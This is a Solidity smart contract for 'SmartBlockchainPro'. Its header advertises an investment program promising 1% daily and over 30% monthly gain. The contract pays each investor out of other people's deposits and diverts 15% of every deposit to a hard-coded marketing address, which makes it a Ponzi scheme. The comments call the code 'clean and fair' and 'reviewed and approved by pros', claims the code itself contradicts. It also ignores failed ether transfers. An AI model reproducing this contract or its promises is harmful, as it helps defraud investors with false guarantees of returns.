pragma solidity ^0.4.25;

/**
 *
 *  https://smart-blockchain.pro
 *  High profit investment program
 *  - More than 30% monthly gain! 1% per day!
 *  - Huge promotion campaign for a long life of our Project
 *  - Clean and fair smart code used
 *
 *	based on easyInvest SC
 *
 * How to use:
 *  1. Send any amount of ether to make an investment
 *  2a. Claim your profit by sending 0 ether transaction any time
 *  OR
 *  2b. Send more ether to reinvest AND get your profit at the same time
 *
 * RECOMMENDED GAS LIMIT: 200000
 * RECOMMENDED GAS PRICE: get from https://ethgasstation.info/
 *
 * Contract reviewed and approved by pros!
 *
 */
contract SmartBlockchainPro {
    // records amounts invested
    mapping (address => uint256) invested;
    // records blocks at which investments were made
    mapping (address => uint256) atBlock;
	
	// address to collect budgets for marketing campaign
	address public marketingAddr = 0x43bF9E5f8962079B483892ac460dE3675a3Ef802;

    // this function called every time anyone sends a transaction to this contract
    function () external payable {
        // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0) {
            // calculate profit amount as such:
            // amount = (amount invested) * 1% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[msg.sender] * 1 / 100 * (block.number - atBlock[msg.sender]) / 5900;

            // send calculated amount of ether directly to sender (aka YOU)
            address sender = msg.sender;
            sender.send(amount);
        }

		if (msg.value != 0) {
			// marketing commission is 15% from your investment
			marketingAddr.send(msg.value * 15 / 100);
		}
		
        // record block number and invested amount (msg.value) of this transaction
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
    }
}